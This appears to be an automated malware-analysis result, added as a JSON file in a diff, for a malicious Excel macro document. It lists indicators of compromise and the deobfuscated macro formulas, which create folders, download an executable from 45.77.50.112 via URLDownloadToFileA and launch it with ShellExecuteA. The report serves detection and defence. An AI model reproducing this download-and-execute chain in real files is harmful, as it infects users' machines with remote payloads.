@@ -1,0 +1,410 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 3000,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Found the following IoCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "45.77.50.112",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "45.77.50.112"
+              ]
+            }
+          }
+        },
+        "title_text": "Deobfuscated IP Addresses",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "http://45.77.50.112/gstyrsOisyc.exe",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "uri": [
+                "http://45.77.50.112/gstyrsOisyc.exe"
+              ]
+            }
+          }
+        },
+        "title_text": "Deobfuscated URLs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe\nrundll32.exe\ngstyrsOisyc.exe\nregsvr32.exe",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "name": {
+              "extracted": [
+                "C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe",
+                "rundll32.exe",
+                "gstyrsOisyc.exe",
+                "regsvr32.exe"
+              ]
+            }
+          }
+        },
+        "title_text": "Deobfuscated Filenames",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "URLDownloadToFileA\nDownload",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "blacklisted": [
+                "URLDownloadToFileA",
+                "Download"
+              ]
+            }
+          }
+        },
+        "title_text": "Deobfuscated PEStudio Blacklisted Strings",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "ShellExecuteA\nURLDownloadToFile\nCreateDirectory\nShellExecute",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "api": [
+                "ShellExecuteA",
+                "URLDownloadToFile",
+                "CreateDirectory",
+                "ShellExecute"
+              ]
+            }
+          }
+        },
+        "title_text": "Deobfuscated Function/Library Strings",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Suspicious formulas found in document",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "HX1064: FORMULA(\"http://45.77.50.112/gstyrsOisyc.exe\",$BB$54)\nHN1235: FORMULA(\"C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe\",$ID$1220)\nIC1487: FORMULA(\"C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe\",$HS$1218)\nHB198: FORMULA(\"URLDownloadToFileA\",$HB$1408)\nGD1163: FORMULA(\"ShellExecuteA\",$EP$1032)\nBD85: FORMULA(\"regsvr32.exe\",$C$1980)\nEN1638: FORMULA(\"rundll32.exe\",$IJ$188)\nG1595: FORMULA(\"CreateDirectoryA\",$HT$1588)\nR1832: CALL(\"Kernel32\",\"CreateDirectoryA\",\"JCJ\",\"C:\\zFCNQfB\",0)\nR1833: CALL(\"Kernel32\",\"CreateDirectoryA\",\"JCJ\",\"C:\\zFCNQfB\\CLVQtJc\",0)\nR1835: CALL(\"URLMON\",\"URLDownloadToFileA\",\"JJCCJJ\",0,\"http://45.77.50.112/gstyrsOisyc.exe\",\"C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe\",0,0)\nR1836: CALL(\"Shell32\",\"ShellExecuteA\",\"JJCCCCJ\",0,\"Open\",\"C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe\",,0,0)",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "name": {
+              "extracted": [
+                "C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe",
+                "rundll32.exe",
+                "gstyrsOisyc.exe",
+                "regsvr32.exe"
+              ]
+            },
+            "string": {
+              "api": [
+                "ShellExecuteA",
+                "URLDownloadToFile",
+                "CreateDirectory",
+                "ShellExecute"
+              ],
+              "blacklisted": [
+                "URLDownloadToFileA",
+                "Download"
+              ]
+            }
+          },
+          "network": {
+            "static": {
+              "ip": [
+                "45.77.50.112"
+              ],
+              "uri": [
+                "http://45.77.50.112/gstyrsOisyc.exe"
+              ]
+            }
+          }
+        },
+        "title_text": "Deobfuscated Formulas",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [],
+    "supplementary": [
+      {
+        "name": "deobfuscated_formulas.txt",
+        "sha256": "b1f87c06e005a063ea6e048dd3f73548d5530fc3639ef734c3fba560237dcbf9"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "file.name.extracted": [
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "C:\\zFCNQfB\\CLVQtJc\\bZTliFa.exe"
+        },
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "gstyrsOisyc.exe"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "gstyrsOisyc.exe"
+        },
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "regsvr32.exe"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "regsvr32.exe"
+        },
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "rundll32.exe"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "rundll32.exe"
+        }
+      ],
+      "file.string.api": [
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "CreateDirectory"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "CreateDirectory"
+        },
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "ShellExecute"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "ShellExecute"
+        },
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "ShellExecuteA"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "ShellExecuteA"
+        },
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "URLDownloadToFile"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "URLDownloadToFile"
+        }
+      ],
+      "file.string.blacklisted": [
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "Download"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "Download"
+        },
+        {
+          "heur_id": 3,
+          "signatures": [],
+          "value": "URLDownloadToFileA"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "URLDownloadToFileA"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "45.77.50.112"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "45.77.50.112"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "http://45.77.50.112/gstyrsOisyc.exe"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "http://45.77.50.112/gstyrsOisyc.exe"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
